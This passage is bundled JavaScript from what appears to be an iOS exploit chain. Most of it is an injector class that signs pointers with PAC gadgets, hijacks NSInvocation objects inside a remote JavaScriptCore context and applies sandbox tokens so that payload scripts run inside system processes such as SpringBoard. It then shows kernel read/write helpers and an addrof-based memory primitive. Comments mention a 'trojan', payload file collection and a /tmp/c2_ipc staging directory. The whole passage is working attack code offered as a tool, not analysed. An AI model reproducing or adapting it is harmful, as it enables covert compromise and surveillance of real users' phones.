			this.#skipDiag = false;
		} else if (opts.skipDiag !== undefined) {
			this.#skipDiag = !!opts.skipDiag;
		} else {
			this.#skipDiag = true;
		}
		this.#invokingAddr = this.#findInvoking();

		this.#JSContextClass = Native.callSymbol("objc_getClass", "JSContext");
		this.#NSMethodSignatureClass = Native.callSymbol("objc_getClass", "NSMethodSignature");
		this.#NSInvocationClass = Native.callSymbol("objc_getClass", "NSInvocation");
		this.#invokeUsingIMPSel = Native.callSymbol("sel_registerName", "invokeUsingIMP:"); 

		if (!this.#invokingAddr)
			injLog("Invoking not found!");
	}

	inject(agentPid=0) {
		if (!this.#invokingAddr)
			return false;

		if (typeof(this.#target) == "string") {
			injLog("Start injecting into " + this.#target + " len=" + (this.#injectCode ? this.#injectCode.length : 0));
			this.task = new libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_1__["default"](this.#target, this.#migFilterBypass, {
				gap_ms: 5000,
				retry_ms: 10000
			});
			if (!this.task || !this.task.success()) {
				injLog("Unable to inject into: " + this.#target);
				try { if (this.task && this.task.destroy) this.task.destroy(); } catch (_) {}
				this.task = null;
				return false;
			}
			injLog("RemoteCall OK target=" + this.#target);
		}
		else {
			injLog("Start injecting into existing task: " + this.#target.pid());

			 // Assume target is a RemoteCall object
			this.task = this.#target;
			if (!this.task.success()) {
				injLog("Unable to inject into existing task");
				return false;
			}
		}

		return !!this.#startWithTask(agentPid);
	}

	destroy() {
		if (this.task && this.task.success())
			this.task.destroy();
		this.task = null;
	}

	#startWithTask(agentPid) {
		const mem = this.task.mem();
		const krwCtx = this.task.krwCtx();

		// Sign __invoking__ function address
		this.#invokingAddr = this.task.pac(this.#invokingAddr, 0);
		//console.log(TAG, "Signed invoking: " + Utils.hex(this.#invokingAddr));

		this.task.writeStr(mem, "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore");
		const lib = this.task.call(1000, "dlopen", mem, RTLD_LAZY);
		//console.log(TAG, "lib: " + Utils.hex(lib));

		// Create a JSC context and get pointer to exceptionHandler NSBlock
		const jscontext = this.#callObjcRetain(this.#JSContextClass, "new");
		//console.log(TAG, "Remote JSC: " + Utils.hex(jscontext));

		const exceptionHandler = this.task.read64(jscontext + 0x28n);
		//console.log(TAG, "Exception handler: " + Utils.hex(exceptionHandler));

		// Register an "invoker()" JS function within our JSC context, having exceptionHandler block as native implementation.
		// We replace exceptionHandler NSInvocation later in this code.
		const invokerStr = this.#writeCFStr(mem, "invoker");
		this.#callObjc(jscontext, "setObject:forKeyedSubscript:", exceptionHandler, invokerStr);
		//console.log(TAG, "invokerStr: " + Utils.hex(invokerStr));

		// Retrieve JSValue of invoker inside JSC context dict
		const invoker = this.#callObjc(jscontext, "objectForKeyedSubscript:", invokerStr);
		//console.log(TAG, "invoker: " + Utils.hex(invoker));

		// Get pointer of NSInvocation inside NSBlock
		const fjval = this.task.read64(invoker + 0x8n);
		const storval = this.task.read64(fjval + 0x40n);
		const invokerObj = this.task.read64(storval + 0x10n);
		//console.log(TAG, "invokerObj: " + Utils.hex(invokerObj));

		this.task.writeStr(mem, "QQQQQQQQQQQQQQQ");
		const lsignature = this.#callObjc(this.#NSMethodSignatureClass, "signatureWithObjCTypes:", mem);

		this.task.writeStr(mem, "@QQQQQQQQQQQQQQ");
		const osignature = this.#callObjc(this.#NSMethodSignatureClass, "signatureWithObjCTypes:", mem);

		// This is an utility NSInvocation object we share with JS to allow objc call with retained return object
		const oinv = this.#callObjcRetain(this.#NSInvocationClass, "invocationWithMethodSignature:", osignature);

		// This is the final NSInvocation object we use to call the actual target function
		const inv = this.#callObjcRetain(this.#NSInvocationClass, "invocationWithMethodSignature:", lsignature);
		//console.log(TAG, "inv: " + Utils.hex(inv));

		// Create a new NSInvocation and replace the NSBlock one with this
		const jsinv = this.#callObjcRetain(this.#NSInvocationClass, "invocationWithMethodSignature:", lsignature);
		//console.log(TAG, "jsinv: " + Utils.hex(jsinv));

		const callBuff = this.task.call(100, "calloc", 1, 0x4000);
		const firstInvokingBuff = callBuff + 0x50n;	// callBuff[10]
		const argsBuff = callBuff + 0x320n;			// callBuff[100]
		const resultBuff = callBuff + 0x640n;		// callBuff[200]

		//console.log(TAG, "callBuff: " + Utils.hex(callBuff));
		//console.log(TAG, "firstInvokingBuff: " + Utils.hex(firstInvokingBuff));
		//console.log(TAG, "argsBuff: " + Utils.hex(argsBuff));
		//console.log(TAG, "resultBuff: " + Utils.hex(resultBuff));

		// Share callBuff with JS
		this.task.writeStr(mem, "nativeCallBuff");
		const jsctx = this.#callObjc(jscontext, "JSGlobalContextRef");
		const nativeCallBuff = this.task.call(100, "JSObjectMakeArrayBufferWithBytesNoCopy", jsctx, callBuff, 0x4000);
		const globalObject = this.task.call(100, "JSContextGetGlobalObject", jsctx);
		const jsName = this.task.call(100, "JSStringCreateWithUTF8CString", mem);
		this.task.call(100, "JSObjectSetProperty", jsctx, globalObject, jsName, nativeCallBuff);

		let localCallBuff = new BigUint64Array(33);
		
		// Second (final) __invoking__ arguments
		localCallBuff[0] = 0x41414141n;	// this should be overwritten at every function call
		localCallBuff[1] = resultBuff; // Result buffer
		localCallBuff[2] = argsBuff; // Arguments buffer
		localCallBuff[3] = 0x120n; // args buff size. Do not touch!

		// First __invoking__ arguments
		localCallBuff[10] = this.#invokingAddr;
		localCallBuff[11] = resultBuff;
		localCallBuff[12] = callBuff;
		localCallBuff[13] = 0xe0n;

		// Some offsets we export to JS
		localCallBuff[20] = callBuff;
		localCallBuff[21] = this.task.pac( Native.callSymbol("dlsym", RTLD_DEFAULT, "dlsym"), 0 );
		localCallBuff[22] = this.task.pac( Native.callSymbol("dlsym", RTLD_DEFAULT, "memcpy"), 0 );
		localCallBuff[23] = this.task.pac( Native.callSymbol("dlsym", RTLD_DEFAULT, "malloc"), 0 );
		localCallBuff[24] = oinv;
		localCallBuff[25] = jsctx;
		localCallBuff[26] =  true ? 1n : 0;	// we pass true if DEBUG is set
		localCallBuff[27] = 1n;
		localCallBuff[28] = 0n;
		localCallBuff[29] = jscontext;
		localCallBuff[30] = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].getKernelBase();
		let desiredPacGadget = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].getPaciaGadget();
		// retreiving correct modifier for 18.4 and above
		if (globalThis.xnuVersion.major == 24 && globalThis.xnuVersion.minor >= 4) {
			desiredPacGadget = Native.pacia(Native.strip(desiredPacGadget),0n);
		}
		localCallBuff[31] = desiredPacGadget;
		localCallBuff[32] = BigInt(agentPid);

		//console.log(TAG, "dlsym: " + Utils.hex(localCallBuff[21]));
		//console.log(TAG, "memcpy: " + Utils.hex(localCallBuff[22]));
		//console.log(TAG, "malloc: " + Utils.hex(localCallBuff[23]));

		const nativeLocalBuff = Native.callSymbol("malloc", localCallBuff.byteLength);
		Native.write(nativeLocalBuff, localCallBuff.buffer);
		this.task.write(callBuff, nativeLocalBuff, localCallBuff.byteLength);
		Native.callSymbol("free", nativeLocalBuff);

		this.#callObjc(inv, "setArgument:atIndex:", firstInvokingBuff, 0);
		this.#callObjc(inv, "setArgument:atIndex:", firstInvokingBuff + 0x8n, 1);
		this.#callObjc(inv, "setArgument:atIndex:", firstInvokingBuff + 0x10n, 2);
		this.#callObjc(inv, "setArgument:atIndex:", firstInvokingBuff + 0x18n, 3);

		// This NSInvocation should in turn call the final NSInvocation we created before,
		// but with fully controlled arguments
		this.task.write64(mem, this.#invokingAddr);
		this.#callObjc(jsinv, "setTarget:", inv);
		this.#callObjc(jsinv, "setSelector:", this.#invokeUsingIMPSel);
		this.#callObjc(jsinv, "setArgument:atIndex:", mem, 2);

		// Replace NSInvocation
		this.task.write64(storval + 0x10n, jsinv);
		this.task.write64(storval + 0x18n, 0n);
		//console.log(TAG, "NSInvocation replaced");

		// syncEval path: detach exceptionHandler so JSC errors don't re-enter invoker gadget.
		// async/old_pe path: keep handler wired like old_pe (background evaluateScript).
		if (this.#syncEval) {
			try {
				this.#callObjc(jscontext, "setExceptionHandler:", 0);
				injLog("exceptionHandler detached (invoker kept as JS global)");
			} catch (detachE) {
				injLog("exceptionHandler detach WARN: " + String(detachE).slice(0, 60));
			}
		}

		// Write loader.js in remote task
		//const loaderJS = "let buff = new BigUint64Array(this.nativeCallBuff); buff[0] = 0x41414141n; buff[100] = 0x11111111n; invoker();";
		injLog("JS script length: " + this.#injectCode.length + " jsctx_ready syncEval=" + this.#syncEval);
		let scriptStr = 0n;
		// Large scripts (>4KB): file -> NSString. Avoid RemoteCall writeStr of 30-50KB
		// (hangs configd). old_pe bg eval is independent of how the NSString is built.
		const INJ_FILE_THRESH = 4096;
		const injPath = this.#injFilePath || "/tmp/c2_ipc/pe_inj_code.js";
		const useFileLoad = !this.#forceCfString && (!!this.#injFilePath || this.#injectCode.length > INJ_FILE_THRESH);
		// SB often needs sandbox tokens BEFORE stringWithContentsOfFile(/tmp/...).
		let tokensApplied = false;
		if (useFileLoad && this.#applyTokensBefore) {
			try {
				injLog("applyTokens BEFORE file load target=" + this.#target);
				libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_3__["default"].applyTokensForRemoteTask(this.task);
				tokensApplied = true;
				injLog("applyTokens BEFORE file load OK");
			} catch (tokE0) {
				injLog("applyTokens BEFORE file load ERR: " + String(tokE0).slice(0, 80));
			}
		}
		if (useFileLoad) {
			try {
				try { Native.callSymbol("mkdir", "/tmp/c2_ipc", 0x1ff); } catch (_) {}
				if (!this.#skipInjFileWrite && this.#injectCode.length > INJ_FILE_THRESH) {
					const wfd = Native.callSymbol("fopen", injPath, "w");
					if (wfd && wfd !== 0 && wfd !== 0n) {
						const wbuf = Native.callSymbol("calloc", 1, this.#injectCode.length + 1);
						Native.writeString(wbuf, this.#injectCode);
						Native.callSymbol("fwrite", wbuf, 1, this.#injectCode.length, wfd);
						Native.callSymbol("fclose", wfd);
						Native.callSymbol("free", wbuf);
					}
				} else if (this.#skipInjFileWrite && this.#injFilePath) {
					injLog("JS script prewritten file " + injPath + " len=" + this.#injectCode.length);
				}
				const NSStringClass = Native.callSymbol("objc_getClass", "NSString");
				const pathCF = this.#writeCFStr(mem, injPath);
				const errSlot = this.task.call(100, "calloc", 1, 8);
				// NSUTF8StringEncoding = 4
				injLog("remote stringWithContentsOfFile begin path=" + injPath);
				scriptStr = this.#callObjc(NSStringClass, "stringWithContentsOfFile:encoding:error:", pathCF, 4, errSlot);
				try { this.task.call(100, "free", errSlot); } catch (_) {}
				injLog("JS script via file " + injPath + " ns=" + (scriptStr ? "ok" : "null"));
			} catch (fe) {
				injLog("JS file load ERR: " + String(fe).slice(0, 80));
				scriptStr = 0n;
			}
		}
		if ((!scriptStr || scriptStr === 0n) && useFileLoad) {
			injLog("JS file load FAILED path=" + injPath + " - abort inject");
			return false;
		}
		if (!scriptStr || scriptStr === 0n) {
			injLog("CFStringCreate path len=" + this.#injectCode.length);
			const scriptMem = this.task.call(100, "calloc", 1, this.#injectCode.length + 1);
			scriptStr = this.#writeCFStr(scriptMem, this.#injectCode);
			this.task.call(100, "free", scriptMem);
		}
		if (!scriptStr || scriptStr === 0n) {
			injLog("scriptStr NULL after CFStringCreate - abort inject");
			return false;
		}
		// Retain NSString/CFString across long sync evaluateScript (file-loaded
		// autoreleased objects can vanish mid-parse of large scripts).
		if (scriptStr && scriptStr !== 0n) {
			try {
				this.#callObjc(scriptStr, "retain");
				injLog("scriptStr retained len=" + this.#injectCode.length);
			} catch (retE) {
				injLog("scriptStr retain WARN: " + String(retE).slice(0, 60));
			}
		}
		//console.log(TAG, "scriptStr: " + Utils.hex(scriptStr));

		// Check if we write ok
		// console.log(TAG,"Check if we write ok" )
		// const a = Native.callSymbol("malloc", this.#injectCode.length + 1);
		// const len = this.#callObjc(scriptStr, "length");
		// console.log(TAG, len);
		// const b = this.#callObjc(scriptStr, "UTF8String");
		// this.task.read(b, a, this.#injectCode.length + 1);
		// const c = Native.readString(a, this.#injectCode.length);
		// console.log(TAG, c);
		

		//const loaderStr = this.#writeCFStr(mem, "loader");
		//this.#callObjc(jscontext, "setObject:forKeyedSubscript:", scriptStr, loaderStr);
		//console.log(TAG, "loaderStr: " + Utils.hex(loaderStr));

		injLog("Starting JS script for target: " + this.#target + " syncEval=" + this.#syncEval);

		// old_pe / v1.5: fire evaluateScript on background thread and return.
		// Tokens must be applied BEFORE the fire when requested - applying on the same
		// RC after fire deadlocks once the bg thread is already in invoker (pe-320 hang).
		if (!this.#syncEval) {
			if (this.#applyTokensBefore && !tokensApplied) {
				try {
					injLog("applyTokens BEFORE background fire target=" + this.#target);
					libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_3__["default"].applyTokensForRemoteTask(this.task);
					injLog("applyTokens BEFORE background fire OK");
				} catch (tokE) {
					injLog("applyTokens BEFORE background fire ERR: " + String(tokE).slice(0, 80));
				}
			}
			injLog("background evaluateScript (old_pe) target=" + this.#target);
			this.#callObjcInBackground(jscontext, "evaluateScript:", scriptStr);
			injLog("All done! (async fire)");
			return true;
		}

		// Tokens BEFORE evaluateScript so payload FS collect/copy works inside sync eval.
		if (this.#applyTokensBefore && !tokensApplied) {
			try {
				injLog("applyTokens BEFORE evaluateScript target=" + this.#target);
				libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_3__["default"].applyTokensForRemoteTask(this.task);
				injLog("applyTokens BEFORE evaluateScript OK");
			} catch (tokE) {
				injLog("applyTokens BEFORE ERR: " + String(tokE).slice(0, 80));
			}
		}

		// Same-thread evaluateScript ladder. Isolates hang before full payload.
		// Set opts.skipDiag=true to skip (or PE_SKIP_INJECT_DIAG).
		const skipDiag = !!(this.#skipDiag) || !!(globalThis.PE_SKIP_INJECT_DIAG);
		if (!skipDiag) {
			try {
				const diagPure = this.#writeCFStr(mem, "0");
				this.#callObjc(jscontext, "evaluateScript:", diagPure);
				injLog("diag pure-JS evaluateScript OK");
			} catch (diagE) {
				injLog("diag pure-JS ERR: " + String(diagE).slice(0, 60));
			}
			try {
				const diagInv =
					"(()=>{var b=new BigUint64Array(nativeCallBuff);b[0]=b[23];b[100]=16n;b[101]=0n;b[102]=0n;b[103]=0n;invoker();b[0]=0x41414141n;})()";
				const diagInvStr = this.#writeCFStr(mem, diagInv);
				this.#callObjcEval(jscontext, "evaluateScript:", diagInvStr, 20000);
				injLog("diag invoker-malloc evaluateScript OK");
			} catch (invE) {
				injLog("diag invoker-malloc ERR: " + String(invE).slice(0, 60));
			}
			// Compact Native.init + getpid via BigUint64Array (same bit-pattern as payload #nc).
			try {
				const diagInit =
					"(()=>{var b=new BigUint64Array(nativeCallBuff);var M=b[23],D=b[21],B=b[20];" +
					"function nc(a,x0,x1,x2,x3){b[0]=a;b[100]=x0||0n;b[101]=x1||0n;b[102]=x2||0n;b[103]=x3||0n;invoker();return b[200];}" +
					"nc(M,0x1000n);var u=new Uint8Array(nativeCallBuff);var n=\"getpid\";" +
					"for(var i=0;i<n.length;i++)u[0x1000+i]=n.charCodeAt(i);u[0x1000+n.length]=0;" +
					"var fp=nc(D,0xfffffffffffffffen,B+0x1000n);nc(fp);b[0]=0x41414141n;})()";
				const diagInitStr = this.#writeCFStr(mem, diagInit);
				this.#callObjcEval(jscontext, "evaluateScript:", diagInitStr, 20000);
				injLog("diag native-init+getpid evaluateScript OK");
			} catch (niE) {
				injLog("diag native-init ERR: " + String(niE).slice(0, 60));
			}
			// class + private fields (payload Native uses #fields) - hang here ? rewrite Native without #.
			try {
				const diagCls =
					"class __PeDiagT{static #a;static go(){var b=new BigUint64Array(nativeCallBuff);this.#a=b[23];b[0]=this.#a;b[100]=16n;b[101]=0n;b[102]=0n;b[103]=0n;invoker();b[0]=0x41414141n;}} __PeDiagT.go();";
				const diagClsStr = this.#writeCFStr(mem, diagCls);
				this.#callObjcEval(jscontext, "evaluateScript:", diagClsStr, 20000);
				injLog("diag class-private evaluateScript OK");
			} catch (clsE) {
				injLog("diag class-private ERR: " + String(clsE).slice(0, 60));
			}
			// Same path as payload: file -> stringWithContentsOfFile -> evaluateScript (~8KB pure JS).
			try {
				const diagPath = "/tmp/c2_ipc/pe_inj_diag_med.js";
				let pad = "var __pe_diag_med=0;\n";
				while (pad.length < 8000) pad += "//xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n";
				pad += "0;\n";
				const wfd = Native.callSymbol("fopen", diagPath, "w");
				if (wfd && wfd !== 0 && wfd !== 0n) {
					const wbuf = Native.callSymbol("calloc", 1, pad.length + 1);
					Native.writeString(wbuf, pad);
					Native.callSymbol("fwrite", wbuf, 1, pad.length, wfd);
					Native.callSymbol("fclose", wfd);
					Native.callSymbol("free", wbuf);
				}
				const NSStringClass = Native.callSymbol("objc_getClass", "NSString");
				const pathCF = this.#writeCFStr(mem, diagPath);
				const errSlot = this.task.call(100, "calloc", 1, 8);
				const medStr = this.#callObjc(NSStringClass, "stringWithContentsOfFile:encoding:error:", pathCF, 4, errSlot);
				try { this.task.call(100, "free", errSlot); } catch (_) {}
				if (medStr && medStr !== 0n) {
					this.#callObjcEval(jscontext, "evaluateScript:", medStr, 20000);
					injLog("diag file-med8k evaluateScript OK");
				} else {
					injLog("diag file-med8k load FAIL");
				}
			} catch (fmE) {
				injLog("diag file-med8k ERR: " + String(fmE).slice(0, 60));
			}
		} else {
			injLog("diag ladder skipped");
		}
		// Size-matched dummy eval is itself an RC evaluateScript; skip when skipDiag
		// (114k pad into SpringBoard watchdog'd the last cold boot).
		if (!skipDiag) {
		try {
			const sz = this.#injectCode ? this.#injectCode.length : 0;
			if (sz > 4096) {
				const diagPath = "/tmp/c2_ipc/pe_inj_diag_size.js";
				let pad = "var __pe_diag_size=" + sz + ";\n";
				while (pad.length < sz - 4) pad += "0;";
				pad += "\n0;\n";
				if (pad.length > sz) pad = pad.slice(0, sz);
				const wfd = Native.callSymbol("fopen", diagPath, "w");
				if (wfd && wfd !== 0 && wfd !== 0n) {
					const wbuf = Native.callSymbol("calloc", 1, pad.length + 1);
					Native.writeString(wbuf, pad);
					Native.callSymbol("fwrite", wbuf, 1, pad.length, wfd);
					Native.callSymbol("fclose", wfd);
					Native.callSymbol("free", wbuf);
				}
				const NSStringClass = Native.callSymbol("objc_getClass", "NSString");
				const pathCF = this.#writeCFStr(mem, diagPath);
				const errSlot = this.task.call(100, "calloc", 1, 8);
				const sizeStr = this.#callObjc(NSStringClass, "stringWithContentsOfFile:encoding:error:", pathCF, 4, errSlot);
				try { this.task.call(100, "free", errSlot); } catch (_) {}
				if (sizeStr && sizeStr !== 0n) {
					try { this.#callObjc(sizeStr, "retain"); } catch (_) {}
					const tSz = Date.now();
					this.#callObjcEval(jscontext, "evaluateScript:", sizeStr, 30000);
					const el = Date.now() - tSz;
					if (el >= 28500) injLog("diag file-size" + sz + " TIMEOUT elapsed_ms=" + el);
					else injLog("diag file-size" + sz + " evaluateScript OK elapsed_ms=" + el);
				} else {
					injLog("diag file-size load FAIL");
				}
			}
		} catch (szE) {
			injLog("diag file-size ERR: " + String(szE).slice(0, 60));
		}
		}
		if (!skipDiag) {
		try {
			const mini =
				"class __PeMini{static base;static M;static D;static init(){var b=new BigUint64Array(nativeCallBuff);this.base=b[20];this.D=b[21];this.M=b[23];}" +
				"static nc(a,x0,x1,x2,x3){var b=new BigUint64Array(nativeCallBuff);b[0]=a;b[100]=x0||0n;b[101]=x1||0n;b[102]=x2||0n;b[103]=x3||0n;invoker();return b[200];}" +
				"static go(){this.init();this.nc(this.M,0x1000n);var u=new Uint8Array(nativeCallBuff);var n=\"getpid\";for(var i=0;i<n.length;i++)u[0x1000+i]=n.charCodeAt(i);u[0x1000+n.length]=0;" +
				"var fp=this.nc(this.D,0xfffffffffffffffen,this.base+0x1000n);this.nc(fp);}} __PeMini.go();";
			const miniStr = this.#writeCFStr(mem, mini);
			const tM = Date.now();
			this.#callObjcEval(jscontext, "evaluateScript:", miniStr, 20000);
			const elM = Date.now() - tM;
			if (elM >= 18500) injLog("diag mini-Native TIMEOUT elapsed_ms=" + elM);
			else injLog("diag mini-Native evaluateScript OK elapsed_ms=" + elM);
		} catch (mnE) {
			injLog("diag mini-Native ERR: " + String(mnE).slice(0, 60));
		}
		}
		// Encoding integrity: same file->NSString path as payload. If nsLen/utf8Bytes
		// match injectCode.length, hang is NOT UTF-8->NSString mangling (??).
		if (!skipDiag) {
		try {
			const expect = this.#injectCode ? this.#injectCode.length : 0;
			const nsLen = Number(this.#callObjc(scriptStr, "length") || 0);
			const utf8Bytes = Number(this.#callObjc(scriptStr, "lengthOfBytesUsingEncoding:", 4) || 0);
			injLog("diag enc-check expect=" + expect + " nsLen=" + nsLen + " utf8Bytes=" + utf8Bytes +
				(expect === utf8Bytes && expect === nsLen ? " MATCH" :
					(expect === utf8Bytes ? " utf8OK_nsDiff" : " MISMATCH")));
		} catch (encE) {
			injLog("diag enc-check ERR: " + String(encE).slice(0, 60));
		}
		}
		const evalMs = 90000;
		const evalT0 = Date.now();
		this.#callObjcEval(jscontext, "evaluateScript:", scriptStr, evalMs);
		const evalElapsed = Date.now() - evalT0;
		// Sync RC timeout leaves trojan mid-evaluateScript; do NOT treat as success.
		if (evalElapsed >= (evalMs - 1500)) {
			injLog("evaluateScript TIMEOUT elapsed_ms=" + evalElapsed + " (RC likely stuck mid-eval)");
			return false;
		}

		injLog("All done! elapsed_ms=" + evalElapsed);
		return true;
	}

	#findInvoking() {
		//console.log(TAG, "Find 'invoking()'...");

		let startAddr = Native.dlsym("_CF_forwarding_prep_0");
		startAddr = startAddr & 0x7fffffffffn; //Chain.strip(startAddr);
		//console.log(TAG, "startAddr: " + Utils.hex(startAddr));

		if (!startAddr)
			return 0;

		if (xnuVersion.major == 24 && xnuVersion.minor >= 5)
			startAddr -= 0x2500n;
		else
			startAddr -= 0x4000n;

		const pattern = new Uint8Array([0x67, 0x1D, 0x40, 0xF9, 0x66, 0x19, 0x40, 0xF9, 0x65, 0x15, 0x40, 0xF9, 0x64, 0x11, 0x40, 0xF9]);
		Native.write(Native.mem, pattern.buffer);
		let foundAddr = Native.callSymbol("memmem", startAddr, 0x4000, Native.mem, 16);
		//console.log(TAG, "foundAddr: " + Utils.hex(foundAddr));

		if (!foundAddr) {
			// special case for iOS 17.4-17.4.1
			//console.log(TAG,`Didnt found invoking,trying to find it for special version`);
			startAddr = Native.dlsym("CFCharacterSetIsCharacterMember");
			startAddr = startAddr & 0x7fffffffffn;
			foundAddr = Native.callSymbol("memmem", startAddr, 0x4000, Native.mem, 16);
			//console.log(TAG,`foundAddr:${Utils.hex(foundAddr)}`);
			if (!foundAddr)
				return 0;
		}

		const buff = Native.read(foundAddr - BigInt(Native.memSize), Native.memSize);
		const buff32 = new Uint32Array(buff);

		for (let i=buff32.length-1; i>=0; i--) {
			foundAddr -= 0x4n;
			if (buff32[i] == 0xd503237f) {
				const found = foundAddr;
				console.log(TAG, "Invoking found: " + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(found));
				return found;
			}
		}

		return 0;
	}

	#callObjc(obj, selName, ...args) {
		const sel = Native.callSymbol("sel_registerName", selName);
		return this.task.call(1000, "objc_msgSend", obj, sel, ...args);
	}

	// Long-timeout objc_msgSend for evaluateScript (invoker-heavy payloads need >>10s floor).
	#callObjcEval(obj, selName, scriptStr, timeoutMs) {
		const sel = Native.callSymbol("sel_registerName", selName);
		const ms = Number(timeoutMs) > 0 ? Number(timeoutMs) : 180000;
		injLog("evaluateScript RC timeout_ms=" + ms);
		return this.task.call(ms, "objc_msgSend", obj, sel, scriptStr);
	}

	#callObjcRetain(obj, selName, ...args) {
		const ret = this.#callObjc(obj, selName, ...args);
		this.#callObjc(ret, "retain");
		return ret;
	}

	#callObjcInBackground(obj, selName, ...args) {
		// old_pe / v1.5: evaluateScript on background thread (fire-and-forget).
		const performSelectorInBackground = Native.callSymbol("sel_registerName", "performSelectorInBackground:withObject:");
		const sel = Native.callSymbol("sel_registerName", selName);
		return this.task.call(1000, "objc_msgSend", obj, performSelectorInBackground, sel, ...args);
	}

	#writeCFStr(dst, str) {
		const kCFStringEncodingUTF8 = 0x08000100;
		this.task.writeStr(dst, str);
		return this.task.call(100, "CFStringCreateWithCString", 0, dst, kCFStringEncodingUTF8);
	}

	#printClass(obj) {
		const cl = this.#callObjc(obj, "class");
		const desc = this.#callObjc(cl, "description");
		const str = this.#callObjc(desc, "UTF8String");
		this.task.read(str, Native.mem, 32);
		const classDesc = Native.readString(Native.mem);
		console.log(TAG, "class: " + classDesc);
	}
}


/***/ }),

/***/ "./src/libs/Chain/Chain.js":
/*!*********************************!*\
  !*** ./src/libs/Chain/Chain.js ***!
  \*********************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ Chain)
/* harmony export */ });
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");


const TAG = "CHAIN"

class Chain
{
	static #driver;
	static #mutex;

	static init(driver, mutex=null)
	{
		this.#driver = driver;
		this.#mutex = mutex;
	}

	static destroy()
	{
		this.#driver.destroy();
	}

	static runPE()
	{
		return this.#driver.runPE();
	}

	static getKernelBase()
	{
		return this.#driver.getKernelBase();
	}

	static getSelfTaskAddr()
	{
		return this.#driver.getSelfTaskAddr();
	}

	static read(srcAddr, dst, len)
	{
		this.#mutexLock();
		let ret = this.#driver.read(srcAddr, dst, len);
		this.#mutexUnlock();
		return ret;
	}

	static write(dst, src, len)
	{
		this.#mutexLock();
		let ret = this.#driver.write(dst, src, len);
		this.#mutexUnlock();
		return ret;
	}

	static readBuff(srcAddr, len)
	{
		if (!this.read(srcAddr, Native.mem, len))
			return false;
		return Native.read(Native.mem, len);
	}

	static read8(src)
	{
		this.read(src, Native.mem, 1);
		return Native.read8(Native.mem);
	}

	static read16(src)
	{
		this.read(src, Native.mem, 2);
		return Native.read16(Native.mem);
	}

	static read32(src)
	{
		this.read(src, Native.mem, 4);
		return Native.read32(Native.mem);
	}

	static read64(src)
	{
		this.read(src, Native.mem, 8);
		return Native.read64(Native.mem);
	}

	static write8(dst, value)
	{
		Native.write8(Native.mem, value);
		this.write(dst, Native.mem, 1);
	}

	static write16(dst, value)
	{
		Native.write16(Native.mem, value);
		this.write(dst, Native.mem, 2);
	}

	static write32(dst, value)
	{
		Native.write32(Native.mem, value);
		this.write(dst, Native.mem, 4);
	}

	static write64(dst, value)
	{
		Native.write64(Native.mem, value);
		this.write(dst, Native.mem, 8);
	}

	static offsets()
	{
		return this.#driver.offsets();
	}

	static strip(val)
	{
		return this.#driver.strip(val);
	}

	static writeZoneElement(dstAddr,src,len)
	{
		return this.#driver.writeZoneElement(dstAddr, src, len);
	}

	static getPaciaGadget()
	{
		return this.#driver.getPaciaGadget();
	}
	static getClearPaciaGadget()
	{
		return this.#driver.getClearPaciaGadget();
	}

	static transferRW()
	{
		let rwCtx = this.#driver.transferRW();
		let controlSocket = rwCtx.controlSocket;
		let rwSocket = rwCtx.rwSocket;
		console.log(TAG, "controlSocket: " + controlSocket);
		console.log(TAG, "rwSocket: " + rwSocket);

		let portPtr = Native.mem;
		Native.callSymbol("fileport_makeport", controlSocket, portPtr);
		let controlPort = Native.read32(portPtr);

		Native.callSymbol("fileport_makeport", rwSocket, portPtr);
		let rwPort = Native.read32(portPtr);

		return {
			controlPort: controlPort,
			rwPort: rwPort,
			controlSocket: controlSocket,
			rwSocket: rwSocket
		};
	}

	static threadSpawn(scriptCFString, threadMem) {
		this.#driver.threadSpawn(scriptCFString, threadMem);
	}

	static testKRW() {
		console.log(TAG, "Testing KRW");
		console.log(TAG, "- kernelBase: " + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(this.getKernelBase()));
		console.log(TAG, "- PACIA gadget: " + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(this.getPaciaGadget()));
		console.log(TAG, "- Read kernel magic (4 bytes)");

		let buff = this.readBuff(this.getKernelBase(), 4);
		if (!buff) {
			console.log(TAG, "kernel RW not working!");
			return false;
		}
		let buff32 = new Uint32Array(buff);
		console.log(TAG, `- Magic: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(buff32[0])}`);

		if (buff32[0] != 0xfeedfacf) {
			console.log(TAG, "Invalid magic!");
			return false;
		}

		return true;
	}

	static #mutexLock() {
		if (this.#mutex)
			Native.callSymbol("pthread_mutex_lock", this.#mutex);
	}

	static #mutexUnlock() {
		if (this.#mutex)
			Native.callSymbol("pthread_mutex_unlock", this.#mutex);
	}
}


/***/ }),

/***/ "./src/libs/Chain/Native.js":
/*!**********************************!*\
  !*** ./src/libs/Chain/Native.js ***!
  \**********************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ Native)
/* harmony export */ });
const RTLD_DEFAULT = 0xFFFFFFFFFFFFFFFEn;

class Native {

	// Preallocated memory chunk for general purpose stuff for public use
	static mem = 0n;
	static memSize = 0x4000;

	// Preallocated memory chunk for encoding/decoding of string arguments
	static #argMem = 0n;

	// Pointer to next available memory for native argument
	static #argPtr = 0n;

	static {
		this.mem = this.callSymbol("malloc", this.memSize);
		this.#argMem = this.callSymbol("malloc", 0x1000n);
		this.#argPtr = this.#argMem;
	}

	static write(ptr, buff) {
		let buffPtr = read64(read64(addrof(buff) + 0x10n) + 0x10n);
